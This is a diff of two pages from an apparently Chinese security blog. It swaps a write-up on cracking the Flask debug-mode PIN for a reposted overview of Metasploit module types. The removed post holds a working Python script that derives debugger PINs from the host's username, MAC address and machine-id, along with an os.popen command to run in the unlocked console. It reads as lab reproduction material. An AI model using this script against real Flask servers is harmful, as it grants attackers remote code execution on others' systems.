@@ -75,7 +75,7 @@
 
 
 
-  <meta name="keywords" content="漏洞复现,">
+  <meta name="keywords" content="转载文章,">
 
 
 
@@ -86,22 +86,18 @@
 
 
 
-<meta name="description" content="flask在开启debug模式时其会生成一个pin码，在同一台机器上，多次重启Flask服务，PIN码值不改变。 这说明PIN码是经过运算生成而不是随机生成的，经过网络搜索，我找到了生成pin 码的流程，生成的pin 码主要由6个值决定的  当前计算机的用户名 flask.app Flask E:\flask-file\flask\lib\site-packages\flask\app.py 当前">
-<meta name="keywords" content="漏洞复现">
+<meta name="description" content="本文转载自博客园 模块通过Metasploit框架所装载、集成并对外提供的最核心的渗透测试功能实现代码。分为辅助模块（Aux)、渗透攻击模块（Exploits)、后渗透攻击模块（Post)、攻击载荷模块（payloads)、编码器模块（Encoders)、空指令模块（Nops)。这些模块拥有非常清晰的结构和一个预定义好的接口，并可以组合支持信息收集、渗透攻击与后渗透攻击拓展。  辅助模块  在渗透">
+<meta name="keywords" content="转载文章">
 <meta property="og:type" content="article">
-<meta property="og:title" content="flask debug模式下pin码安全">
-<meta property="og:url" content="https://yml-sec.top/2019/01/20/flask-debug模式下pin码安全/index.html">
+<meta property="og:title" content="转载-Metasploit模块简介">
+<meta property="og:url" content="https://yml-sec.top/2019/02/21/转载-Metasploit模块简介/index.html">
 <meta property="og:site_name" content="yemoli&#39;s blog">
-<meta property="og:description" content="flask在开启debug模式时其会生成一个pin码，在同一台机器上，多次重启Flask服务，PIN码值不改变。 这说明PIN码是经过运算生成而不是随机生成的，经过网络搜索，我找到了生成pin 码的流程，生成的pin 码主要由6个值决定的  当前计算机的用户名 flask.app Flask E:\flask-file\flask\lib\site-packages\flask\app.py 当前">
+<meta property="og:description" content="本文转载自博客园 模块通过Metasploit框架所装载、集成并对外提供的最核心的渗透测试功能实现代码。分为辅助模块（Aux)、渗透攻击模块（Exploits)、后渗透攻击模块（Post)、攻击载荷模块（payloads)、编码器模块（Encoders)、空指令模块（Nops)。这些模块拥有非常清晰的结构和一个预定义好的接口，并可以组合支持信息收集、渗透攻击与后渗透攻击拓展。  辅助模块  在渗透">
 <meta property="og:locale" content="default">
-<meta property="og:image" content="https://i.imgur.com/vkfGj5R.jpg">
-<meta property="og:image" content="https://i.imgur.com/ZC3PgMb.jpg">
-<meta property="og:image" content="https://i.imgur.com/LZqPzu2.jpg">
-<meta property="og:updated_time" content="2019-01-20T12:19:54.242Z">
+<meta property="og:updated_time" content="2019-02-21T13:55:15.981Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="flask debug模式下pin码安全">
-<meta name="twitter:description" content="flask在开启debug模式时其会生成一个pin码，在同一台机器上，多次重启Flask服务，PIN码值不改变。 这说明PIN码是经过运算生成而不是随机生成的，经过网络搜索，我找到了生成pin 码的流程，生成的pin 码主要由6个值决定的  当前计算机的用户名 flask.app Flask E:\flask-file\flask\lib\site-packages\flask\app.py 当前">
-<meta name="twitter:image" content="https://i.imgur.com/vkfGj5R.jpg">
+<meta name="twitter:title" content="转载-Metasploit模块简介">
+<meta name="twitter:description" content="本文转载自博客园 模块通过Metasploit框架所装载、集成并对外提供的最核心的渗透测试功能实现代码。分为辅助模块（Aux)、渗透攻击模块（Exploits)、后渗透攻击模块（Post)、攻击载荷模块（payloads)、编码器模块（Encoders)、空指令模块（Nops)。这些模块拥有非常清晰的结构和一个预定义好的接口，并可以组合支持信息收集、渗透攻击与后渗透攻击拓展。  辅助模块  在渗透">
 
 
 
@@ -131,13 +127,13 @@
 
 
 
-  <link rel="canonical" href="https://yml-sec.top/2019/01/20/flask-debug模式下pin码安全/">
+  <link rel="canonical" href="https://yml-sec.top/2019/02/21/转载-Metasploit模块简介/">
 
 
 
 
 
-  <title>flask debug模式下pin码安全 | yemoli's blog</title>
+  <title>转载-Metasploit模块简介 | yemoli's blog</title>
   
 
 
@@ -263,7 +259,7 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="https://yml-sec.top/2019/01/20/flask-debug模式下pin码安全/">
+    <link itemprop="mainEntityOfPage" href="https://yml-sec.top/2019/02/21/转载-Metasploit模块简介/">
 
     <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
       <meta itemprop="name" content="夜莫离、">
@@ -280,7 +276,7 @@
 
         
         
-          <h1 class="post-title" itemprop="name headline">flask debug模式下pin码安全</h1>
+          <h1 class="post-title" itemprop="name headline">转载-Metasploit模块简介</h1>
         
 
         <div class="post-meta">
@@ -292,8 +288,8 @@
               
                 <span class="post-meta-item-text">Posted on</span>
               
-              <time title="Post created" itemprop="dateCreated datePublished" datetime="2019-01-20T19:27:07+08:00">
-                2019-01-20
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2019-02-21T21:50:03+08:00">
+                2019-02-21
               </time>
             
 
@@ -324,7 +320,7 @@
                   <span class="post-meta-item-text">Words count in article&#58;</span>
                 
                 <span title="Words count in article">
-                  707
+                  1.6k
                 </span>
               
 
@@ -340,7 +336,7 @@
                   <span class="post-meta-item-text">Reading time &asymp;</span>
                 
                 <span title="Reading time">
-                  3
+                  5
                 </span>
               
             </div>
@@ -361,97 +357,39 @@
       
 
       
-        <p>flask在开启debug模式时其会生成一个pin码，在同一台机器上，多次重启Flask服务，PIN码值不改变。</p>
-<p>这说明PIN码是经过运算生成而不是随机生成的，经过网络搜索，我找到了生成pin 码的流程，生成的pin 码主要由6个值决定的</p>
-<ol>
-<li>当前计算机的用户名</li>
-<li>flask.app</li>
-<li>Flask</li>
-<li>E:\flask-file\flask\lib\site-packages\flask\app.py</li>
-<li>当前计算机网卡的Mac地址(linux下获取该值可以访问：/sys/class/net/eth0(eth1,ens33,eth2)/address)</li>
-<li>win下SOFTWARE\Microsoft\Cryptography注册表的值或者Linux下某个固定文件的值（Linux下访问/etc/machine-id  或 /proc/sys/kernel/random/boot_id）</li>
-</ol>
-<p>在默认配置里找到代码并将其修改，得到猜解pin码的脚本</p>
-<pre><code>import hashlib
-from itertools import chain
-def get_pin(mac):
-probably_public_bits = [
-    &apos;SUN&apos;,# username
-    &apos;flask.app&apos;,# modname
-    &apos;Flask&apos;,# getattr(app, &apos;__name__&apos;, getattr(app.__class__, &apos;__name__&apos;))
-    &apos;E:\\flask-file\\flask\\lib\\site-packages\\flask\\app.py&apos; # getattr(mod, &apos;__file__&apos;, None),
-]
-
-private_bits = [
-    mac ,#&apos;55069833074577&apos;,# str(uuid.getnode()),  /sys/class/net/eth0(eth1,ens33,eth2)/address
-    &apos;2aa76823-5ed2-44aa-97de-ac3f97b955e2&apos;# get_machine_id(), /etc/machine-id  , /proc/sys/kernel/random/boot_id
-]
-
-h = hashlib.md5()
-for bit in chain(probably_public_bits, private_bits):
-    if not bit:
-        continue
-    if isinstance(bit, str):
-        bit = bit.encode(&apos;utf-8&apos;)
-    h.update(bit)
-h.update(b&apos;cookiesalt&apos;)
-
-cookie_name = &apos;__wzd&apos; + h.hexdigest()[:20]
-
-num = None
-if num is None:
-    h.update(b&apos;pinsalt&apos;)
-    num = (&apos;%09d&apos; % int(h.hexdigest(), 16))[:9]
-
-rv =None
-if rv is None:
-    for group_size in 5, 4, 3:
-        if len(num) % group_size == 0:
-            rv = &apos;-&apos;.join(num[x:x + group_size].rjust(group_size, &apos;0&apos;)
-                          for x in range(0, len(num), group_size))
-            break
-    else:
-        rv = num
-
-print(rv)
-
-if __name__ == &apos;__main__&apos;:
-maclist = [&apos;55069833074577&apos;,&apos;1099493587180&apos;,&apos;115366132066698&apos;,&apos;117565155322249&apos;,&apos;345052807176&apos;,&apos;115366132066697&apos;]
-for mac in maclist:
-    get_pin(mac)
-</code></pre><p>这里用本地环境验证一下</p>
-<p>故意将代码写错以触发debug模式</p>
-<p><img src="https://i.imgur.com/vkfGj5R.jpg" alt=""></p>
-<p><img src="https://i.imgur.com/ZC3PgMb.jpg" alt=""></p>
-<p>点击最右侧的小图标会让我们输入pin码</p>
-<p><img src="https://i.imgur.com/LZqPzu2.jpg" alt=""></p>
-<p>现在我们开始计算PIN码</p>
-<ol>
-<li>用户名：SUN</li>
-<li>flask.app</li>
-<li>Flask</li>
-<li>E:\flask-file\flask\lib\site-packages\flask\app.py</li>
-<li>[‘55069833074577’,’1099493587180’,’115366132066698’,’117565155322249’,’345052807176’,’115366132066697’]</li>
-<li>2aa76823-5ed2-44aa-97de-ac3f97b955e2</li>
-</ol>
-<p>运行脚本会计算出6个pin 码</p>
-<p>231-484-767</p>
-<p>177-131-120</p>
-<p>142-563-096</p>
-<p>112-007-296</p>
-<p>244-772-099</p>
-<p>236-421-014</p>
-<p>经过测试,244-772-099是正确的pin码</p>
-<p>linux下调试可用：</p>
-<pre><code>import os
-
-os.popen(&quot;ls /&quot;).read()
-</code></pre><p>这里有几个坑需要注意一下：</p>
-<ol>
-<li>E:\flask-file\flask\lib\site-packages\flask\app.py windows下是不区分大小写的，有时应将路径的大写字母改为小写字母</li>
-<li>E:\flask-file\flask\lib\site-packages\flask\app.py 这个路径有时也会是E:\flask-file\flask\lib\site-packages\flask\app.pyc</li>
-<li>Linux下，第六个数值在获取时，当/etc/machine-id文件显示无任何内容时，可能是该文件为空或者是不存在，这两者是有区别的，当该文件为空时，第六个数值就是“”  而当文件不存在时，第六个数值是/proc/sys/kernel/random/boot_id文件的值</li>
-</ol>
+        <p>本文转载自博客园</p>
+<p>模块通过Metasploit框架所装载、集成并对外提供的最核心的渗透测试功能实现代码。分为辅助模块（Aux)、渗透攻击模块（Exploits)、后渗透攻击模块（Post)、攻击载荷模块（payloads)、编码器模块（Encoders)、空指令模块（Nops)。这些模块拥有非常清晰的结构和一个预定义好的接口，并可以组合支持信息收集、渗透攻击与后渗透攻击拓展。</p>
+<ul>
+<li>辅助模块</li>
+</ul>
+<p>在渗透信息搜集环节提供了大量的辅助模块支持，包括针对各种网络服务的扫描与查点、构建虚假服务收集登录密码、口令猜测等模块。此外，辅助模块中还包括一些无须加载攻击载荷，同时往往不是取得目标系统远程控制权的渗透攻击，例如：拒绝服务攻击。</p>
+<ul>
+<li>渗透攻击模块</li>
+</ul>
+<p>利用发现的安全漏洞或配置弱点对远程目标系统进行攻击，以植入和运行攻击载荷，从而获得对目标系统访问控制权的代码组件。metasploit框架中渗透攻击模块可以按照所利用的安全漏洞所在的位置分为主动渗透攻击与被动渗透攻击两大类。</p>
+<p>主动渗透攻击：所利用的安全漏洞位于网络服务端软件与服务端软件承载的上层应用程序之中，由于这些服务通常是在主机上开启一些监听端口并等待客户端连接，通过连接目标系统网络服务，注入一些特殊构造的包含“邪恶”攻击数据的网络请求内容，触发安全漏洞，并使得远程服务进行执行“邪恶”数据中包含的攻击载荷，从而获取目标系统的控制会话。针对网络服务端的主动渗透攻击属于传统的渗透攻击。还有web应用程序渗透攻击、SCADA工业控制系统服务渗透攻击。</p>
+<p>被动渗透攻击：利用漏洞位于客户端软件中，如浏览器、浏览插件、电子邮件客户端、office与Adobe等各种文档与编辑软件。对于这类存在于客户端软件的安全漏洞，我们无法主动地将数据从远程输入到客户端软件中，因此只能采用被动渗透攻击方式。即构造出“邪恶”的网页、电子邮件或文档文件，并通过架设包含此类恶意内容的服务端、发送邮件附件、结合社会工程学攻击分发并诱骗目标用户打开、结合网络欺骗和劫持技术，等目标系统上的用户访问到这些邪恶内容，从而触发客户端软件中的安全漏洞，给出控制目标系统的shell会话。客户端软件被动渗透攻击能够绕过防火墙等网络边界防护措施，最常见的两类被动渗透攻击为浏览器软件漏洞攻击和文件格式类漏洞攻击。</p>
+<ul>
+<li>攻击载荷模块</li>
+</ul>
+<p>攻击载荷是在渗透攻击成功后促使目标系统运行的一段植入代码，通常作用是为渗透攻击者打开在目标系统上的控制会话连接。在传统的渗透代码开发中，攻击载荷只是一段功能简单的ShellCode代码，以汇编语言编制并转换为目标系统CPU体系结构支持的机器代码，在渗透攻击触发漏洞后，将程序执行流程劫持并跳转入这段机器代码中执行，从而完成ShellCode中实现的单一功能。</p>
+<p>metasploit攻击载荷模块分为独立（Single)、传输器（Stager)、传输体（Stage)三种类型。</p>
+<p>独立攻击载荷是完全自包含的，可直接独立地植入目标系统进行执行，比如“windows/shell_bind_tcp”是适用于Windows操作系统平台，能够将Shell控制会话绑定在指定TCP端口上的攻击载荷。在一些比较特殊情况下，可能会对攻击载荷的大小、运行条件有所限制，比如特定安全漏洞利用时可填充邪恶攻击缓冲区的可用空间很小、windows 7等新型操作系统所引入的NX(堆栈不可执行）、DEP(数据执行保护）等安全防御机制，在这些场景情况下，Metasploit提供了传输器和传输体配对分阶段植入的技术，由渗透攻击模块首先植入代码精悍短小且非常可靠的传输器载荷，然后在运行传输器载荷时进一步下载传输体载荷并执行。</p>
+<ul>
+<li>空指令模块</li>
+</ul>
+<p>空指令（NOP)是一些对程序运行状态不会造成任何实质影响的空操作或无关操作指令，最典型的空指令就是空操作，在X86 CPU体系结构平台上的操作码是ox90.</p>
+<p>在渗透攻击构造邪恶数据缓冲区时，常常要在真正要执行的Shellcode之前添加一段空指令区，这样当触发渗透攻击后跳转执行ShellCode时，有一个较大的安全着陆区，从而避免受到内存地址随机化、返回地址计算偏差等原因造成的ShellCode执行失败，提高渗透攻击的可靠性。</p>
+<ul>
+<li>编码器模块</li>
+</ul>
+<p>攻击载荷与空指令模块组装完成一个指令序列后，在这段指令被渗透攻击模块加入邪恶数据缓冲区交由目标系统运行之前，Metasploit框架还需要完成一道非常重要的工序—-编码。</p>
+<p>编码模块的第一个使命是确保攻击载荷中不会出现渗透攻击过程中应加以避免的”坏字符“。</p>
+<p>编码器第二个使命是对攻击载荷进行”免杀“处理，即逃避反病毒软件、IDS入侵检测系统和IPS入侵防御系统的检测与阻断。</p>
+<ul>
+<li>后渗透模块</li>
+</ul>
+<p>主要支持在渗透攻击取得目标系统远程控制权之后，在受控系统中进行各种各样的后渗透攻击动作，比如获取敏感信息，进一步括展，实施跳板攻击等。</p>
 
       
     </div>
@@ -498,7 +436,7 @@ os.popen(&quot;ls /&quot;).read()
       
         <div class="post-tags">
           
-            <a href="/tags/漏洞复现/" rel="tag"># 漏洞复现</a>
+            <a href="/tags/转载文章/" rel="tag"># 转载文章</a>
           
         </div>
       
@@ -511,8 +449,8 @@ os.popen(&quot;ls /&quot;).read()
         <div class="post-nav">
           <div class="post-nav-next post-nav-item">
             
-              <a href="/2019/01/19/ARP欺骗原理及实例/" rel="next" title="ARP欺骗原理及实例">
-                <i class="fa fa-chevron-left"></i> ARP欺骗原理及实例
+              <a href="/2019/02/19/针对Metasploitable2靶机的测试/" rel="next" title="针对Metasploitable2靶机的测试">
+                <i class="fa fa-chevron-left"></i> 针对Metasploitable2靶机的测试
               </a>
             
           </div>
@@ -520,10 +458,6 @@ os.popen(&quot;ls /&quot;).read()
           <span class="post-nav-divider"></span>
 
           <div class="post-nav-prev post-nav-item">
-            
-              <a href="/2019/01/21/pwn学习笔记-ret2text/" rel="prev" title="pwn学习笔记-ret2text">
-                pwn学习笔记-ret2text <i class="fa fa-chevron-right"></i>
-              </a>
             
           </div>
         </div>
